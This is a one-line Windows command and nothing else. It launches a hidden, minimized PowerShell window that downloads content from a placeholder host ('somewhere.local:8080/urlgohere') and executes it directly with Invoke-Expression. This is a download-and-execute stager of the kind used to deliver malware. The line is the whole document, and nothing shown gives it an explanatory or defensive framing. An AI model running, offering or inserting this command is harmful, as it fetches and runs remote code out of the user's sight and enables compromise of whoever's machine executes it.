cmd /c start /min powershell -w H -c "$response = Invoke-WebRequest -Uri \"somewhere.local:8080/urlgohere\" ; Invoke-Expression $([System.Text.Encoding]::UTF8.GetString($response.Content)) ; "
